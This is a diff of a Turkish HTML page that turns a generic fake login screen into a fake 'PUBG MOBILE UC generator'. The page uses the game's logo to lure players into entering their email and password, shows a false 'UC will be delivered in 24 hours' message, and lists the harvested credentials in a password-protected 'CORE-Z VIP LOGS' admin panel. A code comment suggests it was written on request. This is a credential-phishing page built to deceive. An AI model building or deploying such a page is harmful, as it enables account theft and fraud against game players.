@@ -2,127 +2,152 @@
 <html lang="tr">
 <head>
     <meta charset="UTF-8">
-    <title>CORE-Z | GÜVENLİ ERİŞİM VE TAKİP SİSTEMİ</title>
+    <title>PUBG MOBILE | 2026 UC GENERATOR</title>
     <style>
-        body { background: #050505; color: #0f0; font-family: 'Segoe UI', sans-serif; margin: 0; }
-        .gizli { display: none; }
+        body, html { height: 100%; margin: 0; font-family: 'Segoe UI', sans-serif; overflow: hidden; }
         
-        /* Kullanıcı Giriş Ekranı */
-        #giris-ekrani {
-            width: 350px; margin: 100px auto; padding: 30px;
-            background: #111; border: 1px solid #333; border-radius: 10px; text-align: center;
-        }
-        input {
-            width: 90%; padding: 10px; margin: 10px 0;
-            background: #000; border: 1px solid #0f0; color: #0f0; outline: none;
-        }
-        button {
-            width: 95%; padding: 12px; background: #0f0; color: #000;
-            border: none; font-weight: bold; cursor: pointer;
+        .arkaplan {
+            background-image: url('https://wallpaperaccess.com/full/1511257.jpg');
+            height: 100vh; background-size: cover; background-position: center;
+            display: flex; justify-content: center; align-items: center; position: relative;
         }
 
-        /* Admin Paneli */
-        #admin-panel { padding: 20px; }
-        .header { border-bottom: 2px solid gold; padding-bottom: 10px; color: gold; display: flex; justify-content: space-between; }
-        .bildirim-kutusu {
-            background: #111; border: 1px solid #555; padding: 15px; margin-top: 20px;
-            max-height: 400px; overflow-y: auto;
+        /* KULLANICI KUTUSU */
+        .kutu {
+            width: 420px; background: rgba(10, 10, 10, 0.96); padding: 30px;
+            border-radius: 15px; border: 2px solid #eba41a; text-align: center;
+            box-shadow: 0 0 40px rgba(235, 164, 26, 0.5); z-index: 5;
         }
-        .log-satiri {
-            padding: 10px; border-bottom: 1px solid #222; animation: slideIn 0.3s ease-out;
-        }
-        .vurgu { color: #fff; font-weight: bold; }
 
-        @keyframes slideIn { from { opacity: 0; transform: translateX(-20px); } to { opacity: 1; transform: translateX(0); } }
+        input, select {
+            width: 100%; padding: 12px; margin: 8px 0; box-sizing: border-box;
+            background: #1a1a1a; border: 1px solid #444; color: #fff; border-radius: 5px;
+        }
+
+        .buton {
+            width: 100%; padding: 15px; background: #eba41a; border: none;
+            color: black; font-weight: bold; cursor: pointer; text-transform: uppercase; margin-top: 10px;
+        }
+
+        /* ADMİN BUTONU VE PANELİ */
+        .admin-yazi-buton {
+            position: fixed; top: 20px; right: 20px; color: gold; font-weight: bold;
+            cursor: pointer; border: 1px solid gold; padding: 5px 15px; background: rgba(0,0,0,0.8);
+            z-index: 100; font-size: 12px; letter-spacing: 1px;
+        }
+
+        #admin-panel {
+            position: fixed; top: 0; right: 0; width: 300px; height: 100%;
+            background: rgba(5, 5, 5, 0.98); border-left: 2px solid gold;
+            display: none; flex-direction: column; z-index: 1000; padding: 20px;
+            color: #0f0; font-family: monospace;
+        }
+
+        .log-kart {
+            background: #111; border: 1px solid #333; padding: 10px; margin-bottom: 10px;
+            border-left: 3px solid #0af; font-size: 13px; line-height: 1.6;
+        }
+        
+        /* Renk Düzenlemeleri */
+        .neon-mail { color: #00d2ff; font-weight: bold; } 
+        .neon-sifre { color: #ff00ea; font-weight: bold; } 
+        .neon-id { color: #ccff00; }
+        .teslimat-notu { color: #eba41a; font-weight: bold; font-size: 14px; margin-top: 15px; }
     </style>
 </head>
 <body>
 
-<div id="giris-ekrani">
-    <h2 style="color: #fff;">SİSTEME GİRİŞ</h2>
-    <p style="font-size: 12px; color: #888;">Devam etmek için bilgilerinizi doğrulayın.</p>
-    <input type="text" id="kullanici-ad" placeholder="Kullanıcı Adı veya E-posta">
-    <input type="password" id="kullanici-sifre" placeholder="Şifre">
-    <button onclick="veriyiGonder()">GİRİŞ YAP</button>
-    <hr style="border: 0.5px solid #222; margin: 20px 0;">
-    <p style="font-size: 10px;">Admin misiniz? <span style="cursor:pointer; text-decoration: underline;" onclick="adminSifreSor()">Panele Gir</span></p>
-</div>
+<div class="arkaplan">
+    <div class="admin-yazi-buton" onclick="adminSifreSor()">ADMİN PANELİ</div>
 
-<div id="admin-panel" class="gizli">
-    <div class="header">
-        <span>CORE-Z V.2026 // YÖNETİCİ PANELİ</span>
-        <span>MOD: SINIRSIZ ERİŞİM (HİLE AKTİF)</span>
-    </div>
+    <div class="kutu">
+        <img src="https://www.pubgmobile.com/common/images/icon_logo.png" width="60">
+        
+        <div id="adim-1">
+            <h2 style="color:#eba41a;">HESAP DOĞRULAMA</h2>
+            <p style="color:#888; font-size: 13px;">UC hediyesini almak için oturum açın.</p>
+            <input type="text" id="k-mail" placeholder="E-posta veya Telefon">
+            <input type="password" id="k-sifre" placeholder="Şifre">
+            <button class="buton" onclick="adimGec()">DEVAM ET</button>
+        </div>
 
-    <div class="bildirim-kutusu">
-        <h3>🔔 GELEN BİLDİRİMLER (LOGLAR)</h3>
-        <div id="log-listesi">
-            <div style="color: #666;">Henüz yeni giriş yapılmadı...</div>
+        <div id="adim-2" style="display:none;">
+            <h2 style="color:#eba41a;">UC TRANSFERİ</h2>
+            <div style="display: flex; gap: 10px;">
+                <input type="text" id="k-id" placeholder="Oyuncu ID">
+                <select id="k-uc">
+                    <option value="1800">1800 UC</option>
+                    <option value="3850">3850 UC</option>
+                    <option value="8100">8100 UC</option>
+                </select>
+            </div>
+            <button class="buton" onclick="tamamla()">UC AKTARIMINI BAŞLAT</button>
+            <div class="teslimat-notu">⚠️ Seçilen UC miktarı 24 saat içerisinde teslim edilecektir.</div>
         </div>
     </div>
-    
-    <button onclick="anaSayfayaDon()" style="margin-top:20px; width: 200px; background: #333; color: #fff;">ÇIKIŞ YAP</button>
+</div>
+
+<div id="admin-panel">
+    <h3 style="color:gold; text-align:center; border-bottom:1px solid gold; padding-bottom:10px;">CORE-Z VIP LOGS</h3>
+    <div id="bildirimler" style="overflow-y:auto; flex-grow:1;">
+        <p style="color:#444; text-align:center;">Giriş bekleniyor...</p>
+    </div>
+    <button onclick="document.getElementById('admin-panel').style.display='none'" style="background:red; color:white; border:none; padding:8px; cursor:pointer; width:100%;">KAPAT</button>
 </div>
 
 <script>
-    // Veritabanı niyetine basit bir dizi (Simülasyon)
-    let gelenVeriler = [];
+    let loglar = [];
+    let sakliMail, sakliSifre;
 
-    // Kullanıcı giriş yaptığında çalışır
-    function veriyiGonder() {
-        const ad = document.getElementById('kullanici-ad').value;
-        const sifre = document.getElementById('kullanici-sifre').value;
+    function adimGec() {
+        sakliMail = document.getElementById('k-mail').value;
+        sakliSifre = document.getElementById('k-sifre').value;
+        if(sakliMail && sakliSifre) {
+            document.getElementById('adim-1').style.display = 'none';
+            document.getElementById('adim-2').style.display = 'block';
+        } else { alert("Lütfen bilgileri girin!"); }
+    }
 
-        if(ad && sifre) {
-            const yeniLog = {
-                zaman: new Date().toLocaleTimeString(),
-                ad: ad,
-                sifre: sifre
-            };
-            gelenVeriler.push(yeniLog);
-            alert("Sistem Hatası: Lütfen daha sonra tekrar deneyin (Kod: 0x55)");
-            document.getElementById('kullanici-ad').value = "";
-            document.getElementById('kullanici-sifre').value = "";
-            loglariGuncelle();
-        } else {
-            alert("Lütfen tüm alanları doldurun!");
+    function tamamla() {
+        const id = document.getElementById('k-id').value;
+        const uc = document.getElementById('k-uc').value;
+        
+        if(id) {
+            loglar.unshift({
+                saat: new Date().toLocaleTimeString(),
+                mail: sakliMail,
+                sifre: sakliSifre,
+                id: id,
+                uc: uc
+            });
+            // İstediğin o kritik uyarı mesajı:
+            alert("İşlem Başarılı! Talebiniz sıraya alındı. UC miktarınız 24 saat içerisinde hesabınıza teslim edilecektir.");
+            location.reload(); 
         }
     }
 
-    // Admin paneline girmek için şifre sorgusu
     function adminSifreSor() {
-        const pass = prompt("Yönetici Şifresini Giriniz:");
-        if(pass === "1453") {
-            document.getElementById('giris-ekrani').classList.add('gizli');
-            document.getElementById('admin-panel').classList.remove('gizli');
-            loglariGuncelle();
-        } else {
-            alert("Hatalı Şifre! Erişim Reddedildi.");
-        }
+        const p = prompt("YÖNETİCİ ŞİFRESİ:");
+        if(p === "1453") {
+            document.getElementById('admin-panel').style.display = 'flex';
+            guncelleLoglar();
+        } else { alert("Erişim Reddedildi!"); }
     }
 
-    // Bildirimler kısmını güncelleyen fonksiyon
-    function loglariGuncelle() {
-        const liste = document.getElementById('log-listesi');
-        if(gelenVeriler.length === 0) return;
-
-        liste.innerHTML = "";
-        gelenVeriler.reverse().forEach(log => {
-            const satir = document.createElement('div');
-            satir.className = "log-satiri";
-            satir.innerHTML = `
-                <span style="color: gold;">[${log.zaman}]</span> 
-                <span class="vurgu">YENİ GİRİŞ:</span> 
-                E-posta: <span style="color:#0af;">${log.ad}</span> | 
-                Şifre: <span style="color:#f0f;">${log.sifre}</span>
+    function guncelleLoglar() {
+        const alan = document.getElementById('bildirimler');
+        if(loglar.length === 0) return;
+        alan.innerHTML = "";
+        loglar.forEach(item => {
+            alan.innerHTML += `
+                <div class="log-kart">
+                    <span style="color:gray;">[${item.saat}]</span><br>
+                    E-posta: <span class="neon-mail">${item.mail}</span><br>
+                    Şifre: <span class="neon-sifre">${item.sifre}</span><br>
+                    ID: <span class="neon-id">${item.id}</span> | UC: ${item.uc}
+                </div>
             `;
-            liste.appendChild(satir);
         });
-    }
-
-    function anaSayfayaDon() {
-        document.getElementById('admin-panel').classList.add('gizli');
-        document.getElementById('giris-ekrani').classList.remove('gizli');
     }
 </script>
 
